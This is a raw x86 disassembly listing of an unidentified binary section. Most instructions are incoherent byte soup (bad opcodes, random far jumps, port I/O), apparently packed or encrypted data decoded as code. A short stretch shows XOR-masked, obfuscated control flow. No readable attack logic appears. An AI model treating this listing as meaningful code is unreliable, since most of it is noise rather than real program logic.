  418bf1:	out    dx,al
  418bf2:	shl    cl,1
  418bf4:	mov    DWORD PTR [ebx+0x14],ebx
  418bf7:	es sbb bl,ch
  418bfa:	jnp    0x418bb5
  418bfc:	jo     0x418c18
  418bfe:	sub    al,0xaf
  418c00:	js     0x418c37
  418c02:	jp     0x418bba
  418c04:	outs   dx,BYTE PTR ds:[esi]
  418c05:	out    0x57,eax
  418c07:	sbb    al,0xa8
  418c09:	neg    BYTE PTR [ebx+0x74]
  418c0c:	inc    eax
  418c0d:	addr16 lahf 
  418c0f:	popa   
  418c10:	popa   
  418c11:	call   0x17631763
  418c16:	add    eax,0x1661b7ab
  418c1b:	popf   
  418c1c:	inc    edi
  418c1d:	xchg   al,ch
  418c1f:	(bad)  
  418c20:	fidiv  WORD PTR [ecx]
  418c22:	xchg   DWORD PTR [ebx+0x13],eax
  418c25:	mov    dl,0x7c
  418c27:	popf   
  418c28:	inc    edx
  418c29:	pop    eax
  418c2a:	in     eax,0x71
  418c2c:	or     BYTE PTR [eax+0x7b],bh
  418c2f:	cdq    
  418c30:	sub    WORD PTR [ebx],dx
  418c33:	xchg   edx,eax
  418c34:	ins    DWORD PTR es:[edi],dx
  418c35:	xlat   BYTE PTR ds:[ebx]
  418c36:	clc    
  418c37:	lea    eax,[ecx-0x4b2c831f]
  418c3d:	inc    edx
  418c3e:	sub    DWORD PTR [eax-0x1423149d],0x32d2e5e9
  418c48:	mov    esp,0xde0ec043
  418c4d:	mov    ebp,0xc69f0907
  418c52:	cwde   
  418c53:	stos   DWORD PTR es:[edi],eax
  418c54:	jmp    0xd8ff:0xfdfe7d46
  418c5b:	add    eax,0x96062119
  418c60:	popf   
  418c61:	jecxz  0x418c5f
  418c63:	jecxz  0x418bfd
  418c65:	inc    esp
  418c66:	or     bl,dl
  418c68:	pop    ecx
  418c69:	jb     0x418c3c
  418c6b:	enter  0x7c75,0x51
  418c6f:	sbb    BYTE PTR [esi+0x19],ah
  418c72:	cmc    
  418c73:	jb     0x418c59
  418c75:	xlat   BYTE PTR ds:[ebx]
  418c76:	and    eax,0xb0d8f13e
  418c7b:	push   ecx
  418c7c:	push   0xffffff8d
  418c7e:	cmp    ah,0xbf
  418c81:	clc    
  418c82:	out    0x73,eax
  418c84:	pusha  
  418c85:	shl    BYTE PTR ds:0xcb7813bb,0x25
  418c8c:	nop
  418c8d:	in     al,dx
  418c8e:	lock int3 
  418c90:	xchg   DWORD PTR ds:0x95575a11,ebp
  418c96:	jp     0x418c22
  418c98:	inc    ebp
  418c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c9a:	shl    BYTE PTR [esi+0x105e635a],cl
  418ca0:	dec    ebx
  418ca1:	in     al,dx
  418ca2:	push   ebx
  418ca3:	sbb    dh,al
  418ca5:	jb     0x418cee
  418ca7:	add    eax,0x8ce97dfe
  418cac:	adc    eax,0x1aa303b7
  418cb1:	fmul   st,st(0)
  418cb3:	and    al,BYTE PTR [edi-0x3fad6a49]
  418cb9:	(bad)  
  418cba:	push   eax
  418cbb:	ins    DWORD PTR es:[edi],dx
  418cbc:	repz ja 0x418d17
  418cbf:	(bad)  
  418cc0:	arpl   WORD PTR [edx],cx
  418cc2:	jb     0x418c62
  418cc4:	test   BYTE PTR [ebx+0x677511a5],ah
  418cca:	int3   
  418ccb:	test   eax,0x8f3ab315
  418cd0:	js     0x418d03
  418cd2:	sahf   
  418cd3:	fwait
  418cd4:	mov    edx,0xf681b08d
  418cd9:	out    0xe,eax
  418cdb:	mov    ds:0x372a1319,al
  418ce0:	popf   
  418ce1:	int    0xcd
  418ce3:	repz in eax,0xdc
  418ce6:	xchg   esp,eax
  418ce7:	mov    esp,0xbd836441
  418cec:	xor    al,0xe5
  418cee:	jb     0x418c93
  418cf0:	ficomp WORD PTR [edi]
  418cf2:	imul   eax,DWORD PTR [ecx-0x14],0xffffff9c
  418cf6:	jb     0x418ca3
  418cf8:	push   eax
  418cf9:	outs   dx,BYTE PTR ds:[esi]
  418cfa:	popa   
  418cfb:	mov    bl,0x55
  418cfd:	mov    bl,0x72
  418cff:	cdq    
  418d00:	(bad)  
  418d01:	mov    bl,0x49
  418d03:	cmp    ch,BYTE PTR [edx+0x12]
  418d06:	jle    0x418c9a
  418d08:	mov    bl,0xea
  418d0a:	sbb    al,0x2e
  418d0c:	pop    edx
  418d0d:	xor    dl,BYTE PTR [edx+ecx*4-0x7f63b1f4]
  418d14:	in     eax,dx
  418d15:	out    dx,al
  418d16:	out    dx,al
  418d17:	cmp    bh,al
  418d19:	sub    eax,0xf71fe4c4
  418d1e:	(bad)  
  418d1f:	loope  0x418d16
  418d21:	mov    ds:0xef5ca374,al
  418d26:	rcl    dh,0xe1
  418d29:	das    
  418d2a:	cli    
  418d2b:	stos   BYTE PTR es:[edi],al
  418d2c:	push   esi
  418d2d:	iret   
  418d2e:	(bad)  
  418d2f:	pop    ebx
  418d30:	adc    al,0x7d
  418d32:	inc    ebx
  418d33:	jp     0x418da3
  418d35:	xor    al,0xce
  418d37:	into   
  418d38:	xlat   BYTE PTR ds:[ebx]
  418d39:	push   es
  418d3a:	pop    ebp
  418d3b:	not    DWORD PTR [ebp-0x4e]
  418d3e:	aad    0xc9
  418d40:	and    DWORD PTR [edx],0xfffffff2
  418d43:	sub    cl,BYTE PTR [ebp-0x45]
  418d46:	inc    edi
  418d47:	mov    eax,0x7b89839d
  418d4c:	sub    al,0x9f
  418d4e:	and    BYTE PTR [edi+0x5bb0f199],bl
  418d54:	stos   BYTE PTR es:[edi],al
  418d55:	cmp    edi,DWORD PTR [ecx]
  418d57:	sbb    al,0xe1
  418d59:	jmp    0xc547:0xa60dbd97
  418d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d61:	xchg   ebp,eax
  418d62:	fnsave [eax+0x755d318d]
  418d68:	mov    dh,0xc
  418d6a:	add    eax,0x36a0267c
  418d6f:	xor    bl,BYTE PTR [ebp-0x15]
  418d72:	and    al,0xf4
  418d74:	sbb    dl,bh
  418d76:	jno    0x418d27
  418d78:	call   0x5a74:0xa2bdf75a
  418d7f:	mul    DWORD PTR [ebx]
  418d81:	mov    BYTE PTR [esi+0x49c70f32],0x6
  418d88:	hlt    
  418d89:	jne    0x418d68
  418d8b:	push   edi
  418d8c:	jno    0x418d55
  418d8e:	adc    al,0x30
  418d90:	pop    ecx
  418d91:	mov    bh,0xd6
  418d93:	ds dec edx
  418d95:	and    esp,eax
  418d97:	loope  0x418d42
  418d99:	scas   al,BYTE PTR es:[edi]
  418d9a:	aas    
  418d9b:	or     eax,0x5f083c8f
  418da0:	shr    BYTE PTR [ebp+0x29],0xe
  418da4:	call   0xb5c6:0x7127ac35
  418dab:	mov    eax,0x4b877cc0
  418db0:	mov    esp,0xf99408ac
  418db5:	cli    
  418db6:	rcl    DWORD PTR [edi+0x70],1
  418db9:	ins    DWORD PTR es:[edi],dx
  418dba:	xchg   ebx,eax
  418dbb:	popf   
  418dbc:	data16 jnp 0x418dd5
  418dbf:	mov    bl,BYTE PTR [ecx+0x19ffc9f0]
  418dc5:	icebp  
  418dc6:	ds jle 0x418ddf
  418dc9:	loopne 0x418db8
  418dcb:	add    DWORD PTR ds:0xcc47e802,ebx
  418dd1:	pop    esi
  418dd2:	dec    esp
  418dd4:	adc    ebp,DWORD PTR [edi]
  418dd6:	call   0xe6c8:0xb36e2b33
  418ddd:	push   eax
  418dde:	aam    0x3d
  418de0:	mov    ch,0xc5
  418de2:	pop    eax
  418de3:	clc    
  418de4:	push   edi
  418de5:	mov    cl,0xb4
  418de7:	sub    bl,bl
  418de9:	xor    BYTE PTR [ecx-0x4a],0x27
  418ded:	xchg   ecx,eax
  418dee:	push   edx
  418def:	test   BYTE PTR [eax+0x68],dh
  418df2:	adc    eax,0x5f4c1b7f
  418df7:	mov    DWORD PTR [ecx],esi
  418df9:	fs jmp 0xcfdd:0x44b3f566
  418e01:	xchg   edi,eax
  418e02:	fistp  DWORD PTR [ebx]
  418e04:	mov    ebp,0xd4f72815
  418e09:	outs   dx,BYTE PTR ds:[esi]
  418e0a:	mov    bl,0xec
  418e0c:	push   esp
  418e0d:	rol    ebx,1
  418e0f:	in     eax,0x9d
  418e11:	sub    cl,BYTE PTR [ebp-0x2d023ced]
  418e17:	mov    bh,bl
  418e19:	(bad)  
  418e1a:	loope  0x418e41
  418e1c:	xchg   edi,eax
  418e1d:	xor    al,BYTE PTR [eax-0x6230506d]
  418e23:	test   BYTE PTR [edx+ebp*2+0x7f7fdb3d],0x5a
  418e2b:	inc    edi
  418e2c:	mov    dh,bl
  418e2e:	mov    edx,0xdfe8b46f
  418e33:	inc    ebx
  418e34:	sub    BYTE PTR [ebx*2-0x632647db],cl
  418e3b:	mov    al,0x36
  418e3d:	enter  0x1625,0x3c
  418e41:	dec    edi
  418e42:	into   
  418e43:	cld    
  418e44:	sub    BYTE PTR [eax],ah
  418e46:	out    dx,al
  418e47:	pop    ds
  418e48:	mov    BYTE PTR [esi+ecx*1+0x44],ch
  418e4c:	push   eax
  418e4d:	outs   dx,BYTE PTR ds:[esi]
  418e4e:	inc    ecx
  418e4f:	es (bad) 
  418e51:	lds    edx,FWORD PTR [eax+0x754d7117]
  418e57:	ret    
  418e58:	push   ecx
  418e59:	xlat   BYTE PTR ds:[ebx]
  418e5a:	jno    0x418e95
  418e5c:	dec    eax
  418e5d:	daa    
  418e5e:	and    dh,BYTE PTR ds:0x7ddcfdd7
  418e64:	mov    esi,0x43a18a32
  418e69:	add    al,0x27
  418e6b:	aad    0x9f
  418e6d:	mov    dh,0x2c
  418e6f:	xor    bh,BYTE PTR [ebp-0x3e566c0a]
  418e75:	sub    dl,BYTE PTR [esi+eax*1-0x3f]
  418e79:	sbb    al,0xda
  418e7b:	or     DWORD PTR [esi],edx
  418e7d:	jb     0x418e86
  418e7f:	adc    esp,DWORD PTR [edi-0x6c]
  418e82:	js     0x418eb3
  418e84:	xchg   edx,eax
  418e85:	mov    ds:0xf21ddaaf,al
  418e8a:	mov    ds:0x4822fb38,eax
  418e8f:	mov    al,ds:0x932989e0
  418e94:	test   ebp,0xfc22e412
  418e9a:	mov    esi,0x6ede8c57
  418e9f:	mov    ch,0x7a
  418ea1:	jno    0x418edf
  418ea3:	rcr    eax,0x9
  418ea6:	push   edx
  418ea7:	xchg   ebx,ebx
  418ea9:	into   
  418eaa:	or     BYTE PTR [edx],ah
  418eac:	or     eax,0x9cac6a12
  418eb1:	sub    DWORD PTR [esi+eiz*1],esi
  418eb4:	aas    
  418eb5:	clc    
  418eb6:	out    0x4e,eax
  418eb8:	nop
  418eb9:	add    al,0x69
  418ebb:	dec    esp
  418ebc:	pop    ebx
  418ebd:	dec    edx
  418ebe:	bnd js 0x418f15
  418ec1:	xchg   esi,eax
  418ec2:	push   es
  418ec3:	push   es
  418ec4:	das    
  418ec5:	ins    DWORD PTR es:[edi],dx
  418ec6:	mov    dh,0xb3
  418ec8:	lahf   
  418ec9:	(bad)  
  418eca:	xchg   edi,eax
  418ecb:	call   0xa4e:0xbe7c25ea
  418ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ed3:	or     eax,0xb2b0fcc9
  418ed9:	cld    
  418eda:	adc    eax,DWORD PTR [esi]
  418edc:	cli    
  418edd:	into   
  418ede:	mov    ah,0x5c
  418ee0:	idiv   esi
  418ee2:	jmp    0xe0290c64
  418ee7:	inc    ecx
  418ee8:	or     ch,ah
  418eea:	fidiv  WORD PTR [ebp-0x35]
  418eed:	lds    ecx,FWORD PTR [ecx]
  418eef:	outs   dx,DWORD PTR ds:[esi]
  418ef0:	jno    0x418f59
  418ef2:	addr16 daa 
  418ef4:	mov    cl,0x6e
  418ef6:	gs daa 
  418ef8:	sub    eax,0x7379d0f7
  418efd:	cmp    eax,0x441f2460
  418f02:	retf   
  418f03:	test   DWORD PTR [eax-0x27c07764],eax
  418f09:	mov    ds:0xeebd911e,al
  418f0e:	push   ds
  418f0f:	and    DWORD PTR [eax],ebx
  418f11:	es mov ebp,0x5c01d27a
  418f17:	aaa    
  418f18:	push   esi
  418f19:	lods   eax,DWORD PTR ds:[esi]
  418f1a:	or     al,0x92
  418f1c:	test   DWORD PTR [eax],eax
  418f1e:	adc    al,0xfa
  418f20:	cmp    eax,0x4103ad34
  418f25:	lock dec ebp
  418f27:	or     DWORD PTR [ecx-0x6ccef824],0xa658a285
  418f31:	jmp    0x418f55
  418f33:	nop
  418f34:	int3   
  418f35:	dec    edx
  418f36:	jg     0x418eb9
  418f38:	repnz test esi,esi
  418f3b:	pop    edx
  418f3c:	in     al,0xe3
  418f3e:	cli    
  418f3f:	mov    esi,0x170a427b
  418f44:	xchg   edi,eax
  418f45:	xor    ah,cl
  418f47:	inc    esi
  418f48:	mov    edx,0xb3c9de4f
  418f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f4e:	dec    ebp
  418f4f:	rcr    DWORD PTR [eax+edi*1+0x65f9ff78],1
  418f56:	sub    eax,0x84f5747
  418f5b:	out    0x2c,eax
  418f5d:	shl    DWORD PTR [ebp+0x1bdbb09c],0x41
  418f64:	add    DWORD PTR [eax+0x2904ebbd],edi
  418f6a:	out    dx,eax
  418f6b:	outs   dx,BYTE PTR ds:[esi]
  418f6c:	jb     0x418f0d
  418f6e:	les    ebp,FWORD PTR [eax-0x32]
  418f71:	jnp    0x418fe2
  418f73:	aad    0x89
  418f75:	div    DWORD PTR [ebx-0x7a]
  418f78:	call   0x86968580
  418f7d:	add    bh,BYTE PTR [edi-0x22cdb6aa]
  418f83:	xchg   edx,eax
  418f84:	inc    ebp
  418f85:	std    
  418f86:	mov    eax,0x8e047cf9
  418f8b:	or     al,bl
  418f8d:	cdq    
  418f8e:	xchg   BYTE PTR [edx+0x65],cl
  418f91:	sbb    esp,DWORD PTR [esi+ebp*4+0x5e1b52e8]
  418f98:	push   ebp
  418f99:	outs   dx,DWORD PTR ds:[esi]
  418f9a:	(bad)  
  418f9b:	jmp    0x419008
  418f9d:	bound  ecx,QWORD PTR ds:0x923f66ff
  418fa3:	nop
  418fa4:	mov    al,0x32
  418fa6:	push   eax
  418fa7:	xchg   esp,eax
  418fa8:	adc    esi,esi
  418faa:	cvtps2pd xmm3,QWORD PTR [esi+ecx*2]
  418fae:	repnz sub DWORD PTR [esi],0x6011fb21
  418fb5:	sbb    DWORD PTR [ebx+esi*2+0x49],ecx
  418fb9:	ins    BYTE PTR es:[edi],dx
  418fba:	out    dx,al
  418fbb:	push   edi
  418fbc:	sbb    esp,edi
  418fbe:	sub    DWORD PTR [esi-0x10ce6a80],esp
  418fc4:	sar    BYTE PTR [ebp+0x3b33ff0c],0x8d
  418fcb:	imul   ecx,DWORD PTR [ecx],0xffffffef
  418fce:	xor    edi,0xffffffaf
  418fd1:	or     DWORD PTR [ebx+0x18],ebp
  418fd4:	jg     0x418fdc
  418fd6:	add    dl,BYTE PTR [ecx-0x7f096f50]
  418fdc:	mov    dh,0x90
  418fde:	fld    TBYTE PTR [eax+0x74169754]
  418fe4:	inc    ebx
  418fe5:	int3   
  418fe6:	fs sahf 
  418fe8:	aad    0x10
  418fea:	mov    al,0xae
  418fec:	repz pushf 
  418fee:	arpl   WORD PTR [esi+0x48],cx
  418ff1:	jmp    FWORD PTR [esp+edx*8-0x67]
  418ff5:	sbb    ecx,DWORD PTR [eax]
  418ff7:	or     ch,BYTE PTR [edi+0x25]
  418ffa:	sbb    al,0x87
  418ffc:	mov    esi,0x14a1f517
  419001:	mov    bh,0x8
  419003:	shl    DWORD PTR [eax-0x2dd74f4b],1
  419009:	pop    ebx
  41900a:	repz push ss
  41900c:	ds aas 
  41900e:	dec    edx
  41900f:	lds    edi,FWORD PTR [edi+0x50]
  419012:	xor    BYTE PTR [eax-0x46b93e9f],al
  419018:	lds    edx,FWORD PTR [esi+0x38]
  41901b:	dec    edx
  41901c:	add    DWORD PTR [eax],esi
  41901e:	clc    
  41901f:	test   eax,0x7ba7a068
  419024:	pop    esp
  419025:	mov    ebp,0x41c0487d
  41902a:	(bad)  
  41902b:	jno    0x41902e
  41902d:	xchg   BYTE PTR [ecx+0x54c0f8e1],bh
  419033:	mov    esp,esi
  419035:	mov    edi,0x9f97c238
  41903a:	dec    edi
  41903b:	dec    ebp
  41903c:	pop    edx
  41903d:	dec    eax
  41903e:	ds jg  0x41901c
  419041:	sub    bl,dl
  419043:	pop    ecx
  419044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419045:	pusha  
  419046:	mov    eax,0xfd901d73
  41904b:	and    DWORD PTR [ecx-0x51],esi
  41904e:	fs pop ebp
  419050:	push   ecx
  419051:	xor    edx,DWORD PTR [edi-0x73582d5c]
  419057:	push   cs
  419058:	xchg   esp,eax
  419059:	leave  
  41905a:	jle    0x4190c4
  41905c:	pop    edi
  41905d:	mov    dh,0xc5
  41905f:	pop    edi
  419060:	pop    es
  419061:	mov    esi,0x713d29e8
  419066:	jmp    0x18868cd0
  41906b:	push   ebp
  41906c:	push   eax
  41906d:	cli    
  41906e:	loope  0x4190e2
  419070:	dec    esi
  419071:	dec    ecx
  419072:	stos   BYTE PTR es:[edi],al
  419073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419074:	ret    
  419075:	mov    cl,0xb1
  419077:	xchg   DWORD PTR [edx-0x3a],ecx
  41907a:	(bad)  
  41907c:	pusha  
  41907d:	sub    BYTE PTR cs:[ebp-0x31bb10e4],al
  419084:	retf   
  419085:	imul   ecx,DWORD PTR [edx],0xb475c294
  41908b:	add    bh,BYTE PTR ds:0x1d3807a9
  419091:	enter  0x2412,0x48
  419095:	cdq    
  419096:	dec    ebx
  419097:	or     bh,BYTE PTR [edx]
  419099:	add    ebx,DWORD PTR [edi]
  41909b:	mov    ecx,0xa2d9136a
  4190a0:	ret    0x787
  4190a3:	mov    bh,0x58
  4190a5:	das    
  4190a6:	or     ch,bh
  4190a8:	sbb    BYTE PTR [eax+0x20],al
  4190ab:	mov    al,0x42
  4190ad:	dec    eax
  4190ae:	or     bh,BYTE PTR es:[ecx+0x6f50c325]
  4190b5:	test   eax,0xea62458b
  4190ba:	sar    BYTE PTR [edi],0xa6
  4190bd:	and    eax,0xdce78dfc
  4190c2:	pop    ds
  4190c3:	ret    
  4190c4:	stc    
  4190c5:	pop    eax
  4190c6:	inc    ebx
  4190c7:	push   0xffffffbb
  4190c9:	mov    ch,0xe2
  4190cb:	cmp    DWORD PTR ds:0x167a5a23,esi
  4190d1:	jno    0x41912e
  4190d3:	push   0x6c7d89ed
  4190d8:	pop    ds
  4190d9:	pop    es
  4190da:	loopne 0x419143
  4190dc:	sub    edx,esi
  4190de:	and    dl,ah
  4190e0:	and    ch,BYTE PTR [edx-0x40]
  4190e3:	pop    esp
  4190e4:	cmp    al,0x6
  4190e6:	rol    BYTE PTR [eax],cl
  4190e8:	sahf   
  4190e9:	jge    0x419074
  4190eb:	loopne 0x4190c6
  4190ed:	ja     0x419087
  4190ef:	sar    DWORD PTR [edi-0x8353a19],cl
  4190f5:	lods   eax,DWORD PTR ds:[esi]
  4190f6:	dec    ebx
  4190f7:	nop
  4190f8:	lea    esp,[ebx-0x1c3405f5]
  4190fe:	mov    esp,0x14f88983
  419103:	pop    ebp
  419104:	dec    ebx
  419105:	int3   
  419106:	inc    edx
  419107:	mov    cl,0x83
  419109:	or     eax,0x6a831add
  41910e:	push   cs
  41910f:	push   es
  419110:	sub    BYTE PTR [edx],0x5b
  419113:	pop    eax
  419114:	mov    bh,0x98
  419116:	mov    ds:0x6edadeb0,eax
  41911b:	imul   ebp,DWORD PTR [ebx],0x864647f8
  419121:	retf   0x81ce
  419124:	push   ecx
  419125:	and    DWORD PTR [ebx-0x6a],0x7a
  419129:	adc    edx,DWORD PTR [eax+ebp*8-0x14]
  41912d:	sbb    al,0xa5
  41912f:	outs   dx,BYTE PTR ds:[esi]
  419130:	es ds push esp
  419133:	add    ch,BYTE PTR [edi+0x5dcd3f73]
  419139:	fisttp WORD PTR [edx+0x2d2c56c3]
  41913f:	sbb    dh,cl
  419141:	imul   ecx,DWORD PTR [ecx+0x558bb055],0x8
  419148:	mov    ebx,DWORD PTR [ebp-0x4c]
  41914b:	add    edx,edi
  41914d:	and    edx,ebx
  41914f:	mov    DWORD PTR [ebp-0x4c],edx
  419152:	mov    edx,DWORD PTR [ebp+0x8]
  419155:	mov    ebx,DWORD PTR [ebp-0x48]
  419158:	lea    edx,[ebx+edx*1+0x241fcdf]
  41915f:	mov    DWORD PTR [ebp-0x48],edx
  419162:	mov    edx,DWORD PTR [ebp+0x8]
  419165:	mov    ebx,0xfa5e1524
  41916a:	sub    ebx,edx
  41916c:	add    ebx,DWORD PTR [ebp-0x44]
  41916f:	mov    DWORD PTR [ebp-0x44],ebx
  419172:	mov    edx,DWORD PTR [ebp+0x8]
  419175:	xor    edx,eax
  419177:	add    edx,esi
  419179:	jne    0x416da2
  41917f:	mov    edx,DWORD PTR [ebp-0x8]
  419182:	mov    ebx,DWORD PTR [ebp-0xc]
  419185:	xor    edx,eax
  419187:	lea    edx,[edx+ebx*1+0x3272f5]
  41918e:	mov    DWORD PTR [ebp-0xc],edx
  419191:	mov    edx,DWORD PTR [ebp-0x10]
  419194:	xor    edx,eax
  419196:	add    edx,esi
  419198:	jne    0x4124bd
  41919e:	jmp    0x41b615
  4191a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4191a6:	mov    DWORD PTR [ebp+0x8],ecx
  4191a9:	jmp    0x41b582
  4191ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4191b1:	mov    edx,DWORD PTR [ebp-0x8]
  4191b4:	xor    ecx,eax
  4191b6:	xor    edx,eax
  4191b8:	sub    ecx,edx
  4191ba:	sub    ecx,esi
  4191bc:	xor    ecx,eax
  4191be:	mov    DWORD PTR [ebp+0x8],ecx
  4191c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4191c4:	mov    edx,DWORD PTR [ebp-0x58]
  4191c7:	add    ecx,0x5708e2
  4191cd:	imul   ecx,edx
  4191d0:	mov    DWORD PTR [ebp-0x58],ecx
  4191d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4191d6:	mov    edx,DWORD PTR [ebp-0x54]
  4191d9:	add    ecx,0x64f880
  4191df:	or     ecx,edx
  4191e1:	mov    DWORD PTR [ebp-0x54],ecx
  4191e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4191e7:	mov    edx,DWORD PTR [ebp-0x50]
  4191ea:	add    ecx,0x242ebf1
  4191f0:	xor    ecx,edx
  4191f2:	mov    DWORD PTR [ebp-0x50],ecx
  4191f5:	jmp    0x41b555
  4191fa:	pop    edx
  4191fb:	cmp    al,0xf8
  4191fd:	inc    esp
  4191fe:	xchg   esi,eax
  4191ff:	test   dl,cl
  419201:	and    al,BYTE PTR [edx-0x5208d874]
  419207:	or     bh,dl
  419209:	pushf  
  41920a:	xor    esp,DWORD PTR [eax]
  41920c:	add    BYTE PTR [ebx-0x7c7ca1c2],0x3d
  419213:	dec    ecx
  419214:	dec    edx
  419215:	sub    esp,DWORD PTR [eax+ebp*4+0x15]
  419219:	mov    eax,ds:0x84d23d65
  41921e:	sar    ecx,1
  419220:	xor    ch,BYTE PTR [eax+esi*1-0x3b7ab7fb]
  419227:	call   0x2cb7:0xe0d99892
  41922e:	les    ebx,FWORD PTR [ebp+0x13]
  419231:	aas    
  419232:	xchg   esi,eax
  419233:	pusha  
  419234:	das    
  419235:	stos   BYTE PTR es:[edi],al
  419236:	sbb    bh,BYTE PTR [ecx+0x643a6f6]
  41923c:	xchg   edi,eax
  41923d:	pop    eax
  41923e:	adc    BYTE PTR [edi-0x37],cl
  419241:	sbb    eax,0x93d27d0e
  419246:	idiv   cl
  419248:	sbb    BYTE PTR [ecx],al
  41924a:	mov    DWORD PTR [eax+eiz*8-0x71415c68],ebp
  419251:	jbe    0x4192a5
  419253:	fsubr  st,st(7)
  419255:	pop    ebx
  419256:	mov    ecx,0xe0943004
  41925b:	scas   al,BYTE PTR es:[edi]
  41925c:	in     eax,dx
  41925d:	fadd   QWORD PTR [esi+0x1b59f9c9]
  419263:	adc    al,0x55
  419265:	xchg   ecx,eax
  419266:	sbb    BYTE PTR [edx-0x2c],cl
  419269:	dec    eax
  41926a:	ficomp WORD PTR ds:0x5daf536b
  419270:	sbb    al,0x42
  419272:	jp     0x419286
  419274:	add    edi,eax
  419276:	jecxz  0x41923c
  419278:	mov    bl,BYTE PTR [ebx-0x41]
  41927b:	add    eax,0x70a54381
  419280:	fbld   TBYTE PTR [edx]
  419282:	lds    eax,FWORD PTR [ebx-0x37]
  419285:	arpl   WORD PTR [esp+ebx*8],di
  419288:	jb     0x419252
  41928a:	cmp    al,0x1b
  41928c:	jno    0x41922f
  41928e:	pop    esi
  41928f:	sub    eax,0x54e380be
  419294:	stos   DWORD PTR es:[edi],eax
  419295:	jno    0x41929c
  419297:	or     BYTE PTR [eax+0x70],bh
  41929a:	stc    
  41929b:	sbb    bh,BYTE PTR [esi]
  41929d:	sub    bh,BYTE PTR ds:0x4e1bd94b
  4192a3:	fild   QWORD PTR [ebx]
  4192a5:	mov    ?,WORD PTR [ecx-0x27587885]
  4192ab:	mov    ebx,DWORD PTR [esi]
  4192ad:	adc    eax,0xda402db1
  4192b2:	xchg   esi,eax
  4192b3:	push   es
  4192b4:	xor    DWORD PTR [ecx],edx
  4192b6:	mov    al,0xdb
  4192b8:	je     0x4192bc
  4192ba:	loopne 0x419316
  4192bc:	daa    
  4192bd:	test   al,0x92
  4192bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192c0:	jmp    0x4192e1
  4192c2:	sti    
  4192c3:	popf   
  4192c4:	jne    0x4192fc
  4192c6:	jb     0x419297
  4192c8:	push   0x6f170d9d
  4192cd:	mov    ds:0x69812447,eax
  4192d2:	repnz aas 
  4192d4:	test   BYTE PTR [esi-0x61],dl
  4192d7:	in     eax,dx
  4192d8:	daa    
  4192d9:	leave  
  4192da:	loop   0x41929a
  4192dc:	cmp    BYTE PTR [ebx-0x34],dh
  4192df:	pusha  
  4192e0:	and    BYTE PTR [eax-0x55d774c7],dl
  4192e6:	sub    ch,0x7d
  4192e9:	cmp    DWORD PTR [eax+ecx*1-0x4a],edx
  4192ed:	sub    eax,0xd268f172
  4192f2:	test   al,0x82
  4192f4:	popf   
  4192f5:	rcr    BYTE PTR [esi-0x57],cl
  4192f8:	jno    0x4192b3
  4192fa:	mov    esp,0x98705292
  4192ff:	sub    al,0xfd
  419301:	js     0x41936e
  419303:	fcomp  QWORD PTR [edi+edi*4]
  419306:	mov    al,ds:0x677b63fb
  41930b:	mov    edi,DWORD PTR [ecx-0x10]
  41930e:	push   cs
  41930f:	sbb    al,0x8b
  419311:	fnstenv [ecx]
  419313:	outs   dx,DWORD PTR ds:[esi]
  419314:	stc    
  419315:	dec    edx
  419316:	inc    esp
  419317:	fwait
  419318:	not    eax
  41931a:	inc    esp
  41931b:	loop   0x419348
  41931d:	rcl    BYTE PTR [ecx+esi*4+0x6e],0x6e
  419322:	cmp    ecx,esi
  419324:	(bad)
  419328:	mov    esi,0xf9f83ef
  41932d:	call   0x7d31:0x73c7c5de
  419334:	aam    0x70
  419336:	xor    edx,edx
  419338:	vaddpd xmm3,xmm5,xmm1
  41933c:	sub    bh,ah
  41933e:	pop    edi
  41933f:	out    0x92,al
  419341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419342:	cmp    ebp,esi
  419344:	rol    BYTE PTR [ecx],1
  419346:	xor    dl,BYTE PTR ds:0x14dab99d
  41934c:	loopne 0x4192ff
  41934e:	xor    BYTE PTR [edi+0x4c],al
  419351:	cmp    eax,0xf2e5f541
  419356:	mov    eax,ds:0xa10a3618
  41935b:	ja     0x419340
  41935d:	loopne 0x4193c8
  41935f:	or     eax,0xa8e1ae6b
  419364:	dec    ebx
  419365:	pop    ss
  419366:	ret    
  419367:	pop    ecx
  419368:	mov    ebx,DWORD PTR [ecx+0x22]
  41936b:	dec    eax
  41936c:	test   al,0x3
  41936e:	(bad)  
  41936f:	sti    
  419370:	out    0x47,eax
  419372:	pop    es
  419373:	jmp    0x4193f1
  419375:	add    DWORD PTR [edi],eax
  419377:	dec    esi
  419378:	sub    eax,DWORD PTR [ecx+0x16]
  41937b:	add    eax,0x14a784c5
  419380:	and    ah,bl
  419382:	mov    BYTE PTR ss:[esi-0x5d10cd50],dh
  419389:	sbb    eax,0x8e76367d
  41938e:	jo     0x41932f
  419390:	adc    edx,ebp
  419392:	fld    DWORD PTR [esi-0x74a4761a]
  419399:	jnp    0x419348
  41939b:	and    BYTE PTR [ebx],bh
  41939d:	dec    ebx
  41939e:	add    eax,0x4a770edc
  4193a3:	out    dx,al
  4193a4:	out    0xf4,al
  4193a6:	pop    esp
  4193a7:	and    al,0xe7
  4193a9:	cwde   
  4193aa:	ss mov edi,0x53742a0d
  4193b0:	fstp   TBYTE PTR [ecx+0x53752c74]
  4193b6:	push   0xffffffb5
  4193b8:	cmp    BYTE PTR [eax],ah
  4193ba:	push   ds
  4193bb:	(bad)  
  4193be:	ret    0x41be
  4193c1:	add    ecx,DWORD PTR [eax+esi*2-0x3e]
  4193c5:	jne    0x4193a0
  4193c7:	mov    al,ds:0x2861a4e1
  4193cc:	ret    0x195d
  4193cf:	mov    BYTE PTR [ebp-0x5d],dh
  4193d2:	shr    BYTE PTR [eax-0x25],1
  4193d5:	into   
  4193d6:	or     ebp,DWORD PTR ss:[ecx-0x6b]
  4193da:	fwait
  4193db:	leave  
  4193dc:	or     ebx,ebx
  4193de:	mov    edx,0x4e73dffb
  4193e3:	mov    dh,0x2
  4193e5:	bnd jp 0x419422
  4193e8:	out    0x76,al
